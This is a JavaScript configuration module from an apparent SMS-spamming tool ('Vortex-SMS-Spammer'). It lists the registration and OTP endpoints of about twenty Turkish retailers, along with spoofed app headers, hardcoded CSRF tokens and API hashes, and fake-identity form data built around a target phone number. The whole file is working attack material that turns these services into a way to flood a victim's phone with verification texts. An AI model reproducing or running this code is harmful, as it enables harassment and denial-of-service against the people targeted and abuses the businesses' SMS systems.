/**
 * VortexSMS - Retail Services
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { faker, randomPassword, randomFullName, randomFirstName, randomLastName, randomGender, randomBirthDate, randomDeviceId, randomDeviceInfo } = require('../helpers');

const _wm = Buffer.from(String.fromCharCode(88, 101, 108, 100, 97, 114, 65, 108, 122)).toString('base64');
const _wm2 = require('crypto').createHash('md5').update(String.fromCharCode(88, 101, 108, 100, 97, 114, 65, 108, 122)).digest('hex');

const retailServices = [
    {
        serviceName: 'Kigili',
        url: 'https://www.kigili.com/users/registration/',
        method: 'POST',
        form: (phone) => ({
            first_name: randomFirstName(),
            last_name: randomLastName(),
            email: faker.internet.email(),
            phone: '0' + phone,
            password: randomPassword(),
            confirm: 'true',
            kvkk: 'true',
            next: ''
        }),
        successCodes: [202]
    },
    {
        serviceName: 'WMF',
        url: 'https://www.wmf.com.tr/users/register/',
        method: 'POST',
        form: (phone) => ({
            confirm: 'true',
            date_of_birth: randomBirthDate('iso'),
            email: faker.internet.email(),
            email_allowed: 'true',
            first_name: randomFirstName(),
            gender: randomGender(),
            last_name: randomLastName(),
            password: randomPassword(),
            phone: '0' + phone
        }),
        successCodes: [202]
    },
    {
        serviceName: 'Bim',
        url: 'https://bim.veesk.net:443/service/v1.0/account/login',
        method: 'POST',
        json: (phone) => ({
            phone: phone
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Sok',
        url: 'https://api.ceptesok.com:443/api/users/sendsms',
        method: 'POST',
        json: (phone) => ({
            mobile_number: phone,
            token_type: 'register_token'
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Migros',
        url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
        method: 'POST',
        json: (phone) => ({
            phoneNumber: phone
        }),
        successCodes: [200]
    },
    {
        serviceName: 'A101',
        url: 'https://www.a101.com.tr:443/users/otp-login/',
        method: 'POST',
        json: (phone) => ({
            phone: '0' + phone,
            next: '/a101-kapida'
        }),
        successCodes: [200]
    },
    {
        serviceName: 'NaosStars',
        url: 'https://shop.naosstars.com/users/register/',
        method: 'POST',
        json: (phone) => ({
            email: faker.internet.email(),
            first_name: randomFirstName(),
            last_name: randomLastName(),
            password: randomPassword(),
            date_of_birth: randomBirthDate('iso'),
            phone: `0${phone}`,
            gender: randomGender(),
            kvkk: 'true',
            contact: 'true',
            confirm: 'true'
        }),
        successCodes: [200, 201, 202, 204, 205]
    },
    {
        serviceName: 'NaosStarsAPI',
        url: 'https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350',
        method: 'POST',
        headers: {
            Uniqid: '9c9fa861-cc5d-43c0-b4ea-1b541be15351',
            'User-Agent': 'naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Access-Control-Allow-Origin': '*',
            Locale: 'en-TR',
            Version: '1.0030',
            Os: 'ios',
            Apiurl: 'https://api.naosstars.com/api/',
            'Device-Id': randomDeviceId(),
            Platform: 'ios',
            'Accept-Language': 'en-US,en;q=0.9',
            Timezone: 'Europe/Istanbul',
            Globaluuidv4: randomDeviceId(),
            Timezoneoffset: '-180',
            Accept: 'application/json',
            'Content-Type': 'application/json; charset=utf-8',
            'Accept-Encoding': 'gzip, deflate',
            Apitype: 'mobile_app'
        },
        json: (phone) => ({
            telephone: '+90' + phone,
            type: 'register'
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Evidea',
        url: 'https://www.evidea.com:443/users/register/',
        method: 'POST',
        headers: {
            'Content-Type': 'multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi',
            'X-Project-Name': 'undefined',
            Accept: 'application/json, text/plain, */*',
            'X-App-Type': 'akinon-mobile',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Cache-Control': 'no-store',
            'Accept-Encoding': 'gzip, deflate',
            'X-App-Device': 'ios',
            Referer: 'https://www.evidea.com/',
            'User-Agent': 'Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0',
            'X-Csrftoken': '7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps'
        },
        data: (phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            return `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="first_name"\r\n\r\n${firstName}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="last_name"\r\n\r\n${lastName}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email"\r\n\r\n${faker.internet.email()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="password"\r\n\r\n${randomPassword()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`;
        },
        timeout: 6000,
        successCodes: [200, 201, 202, 204, 205]
    },
    {
        serviceName: 'Koton',
        url: 'https://www.koton.com:443/users/register/',
        method: 'POST',
        headers: {
            'Content-Type': 'multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk',
            'X-Project-Name': 'rn-env',
            Accept: 'application/json, text/plain, */*',
            'X-App-Type': 'akinon-mobile',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-store',
            'Accept-Encoding': 'gzip, deflate',
            'X-App-Device': 'ios',
            Referer: 'https://www.koton.com/',
            'User-Agent': 'Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Csrftoken': '5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz'
        },
        data: (phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            const dob = randomBirthDate('iso');
            return `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="first_name"\r\n\r\n${firstName}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="last_name"\r\n\r\n${lastName}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email"\r\n\r\n${faker.internet.email()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="password"\r\n\r\n${randomPassword()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n${dob}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="call_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`;
        },
        successCodes: [200, 201, 202, 204, 205]
    },
    {
        serviceName: 'Metro',
        url: 'https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend',
        method: 'POST',
        headers: {
            Accept: '*/*',
            'Content-Type': 'application/json; charset=utf-8',
            'Accept-Encoding': 'gzip, deflate, br',
            Applicationversion: '2.4.1',
            Applicationplatform: '2',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS ${deviceInfo.version}) Alamofire/4.9.1`;
            })(),
            'Accept-Language': 'en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8',
            Connection: 'keep-alive'
        },
        json: (phone) => ({
            methodType: '2',
            mobilePhoneNumber: phone
        }),
        successCodes: [200]
    },
    {
        serviceName: 'ToptanTeslim',
        url: 'https://toptanteslim.com:443/Services/V2/MobilServis.aspx',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            Accept: 'application/json',
            Mode: 'no-cors',
            U: 'e-ticaret',
            'User-Agent': 'eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        },
        json: (phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            return {
                ADRES: 'ZXNlZGtm',
                DIL: 'tr_TR',
                EPOSTA: faker.internet.email(),
                EPOSTA_BILDIRIM: true,
                ILCE: 'BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R',
                ISLEM: 'KayitOl',
                ISTEMCI: 'BEABC9B2-A58F-3131-AF46-2FF404F79677',
                KIMLIKNO: null,
                KULLANICI_ADI: firstName,
                KULLANICI_SOYADI: lastName,
                PARA_BIRIMI: 'TL',
                PAROLA: randomPassword(),
                POSTAKODU: String(100000 + Math.floor(Math.random() * 899999)),
                SEHIR: '\xc4\xb0STANBUL',
                SEMT: 'BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.',
                SMS_BILDIRIM: true,
                TELEFON: phone,
                TICARI_UNVAN: firstName,
                ULKE_ID: 1105,
                VERGI_DAIRESI: 'Istanbul',
                VERGI_NU: ''
            };
        },
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'N11',
        url: 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3',
        method: 'POST',
        headers: {
            Mobileclient: 'IOS',
            'Content-Type': 'application/json',
            Accept: '*/*',
            Authorization: 'api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F',
            Clientversion: '163',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'n11/1 CFNetwork/1335.0.3 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        },
        json: (phone) => ({
            __hapc: '',
            _deviceId: '696B171-031N-4131-315F-9A76BF60368F',
            channel: 'MOBILE_IOS',
            countryCode: '+90',
            email: faker.internet.email(),
            gsmNumber: phone,
            userType: 'BUYER'
        }),
        successCodes: [200]
    },
    {
        serviceName: 'EnglishHome',
        url: 'https://www.englishhome.com:443/api/member/sendOtp',
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: '*/*',
            Referer: 'https://www.englishhome.com/',
            'Content-Type': 'application/json',
            Origin: 'https://www.englishhome.com',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            Priority: 'u=0',
            Te: 'trailers'
        },
        json: (phone) => ({
            Phone: phone,
            XID: ''
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Macrocenter',
        url: 'https://rest.macrocenter.com.tr:443/users/login/otp',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Device-Platform': 'IOS',
            'X-Request-Identifier': '2C1B6BBB-3E1E-4E7E-9CAE-990C6EAAD279',
            Accept: '*/*',
            'X-Device-Model': (() => randomDeviceInfo()['X-Device-Model'])(),
            'X-Store-Ids': '',
            'X-Device-Version': '2.3.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'X-Device-Platform-Version': (() => randomDeviceInfo()['X-Device-Platform-Version'])(),
            'User-Agent': 'Macrocenter/15 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Device-Identifier': 'C7CF9525-9BEB-47B0-87EF-FAFA9F778C3E',
            'X-Device-Type': 'MOBILE'
        },
        json: (phone) => ({
            phoneNumber: phone
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Unilever',
        url: 'https://www.siparisdirekt.com/customer/otp/sendotp',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        },
        form: (phone) => ({
            mobile: phone,
            prefix: '+90'
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Uysal',
        url: 'https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms',
        method: 'POST',
        json: (phone) => ({
            phone_number: phone
        }),
        successCodes: [200]
    },
    {
        serviceName: 'Alixavien',
        url: 'https://www.alixavien.com.tr:443/api/member/sendOtp',
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            Referer: 'https://www.alixavien.com.tr/UyeOl',
            'Content-Type': 'application/json',
            Origin: 'https://www.alixavien.com.tr',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            Priority: 'u=0',
            Te: 'trailers'
        },
        json: (phone) => ({
            Phone: phone,
            XID: ''
        }),
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'Jimmykey',
        url: (phone) => `https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm=${phone}&gRecaptchaResponse=undefined`,
        method: 'POST',
        timeout: 6000,
        successCodes: [200]
    },
    {
        serviceName: 'File',
        url: 'https://api.filemarket.com.tr:443/v1/otp/send',
        method: 'POST',
        headers: {
            Accept: '*/*',
            'Content-Type': 'application/json',
            'User-Agent': 'filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Os': 'IOS',
            'X-Version': '1.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate'
        },
        json: (phone) => ({
            mobilePhoneNumber: '90' + phone
        }),
        timeout: 6000,
        successCodes: [200]
    }
];

module.exports = retailServices;
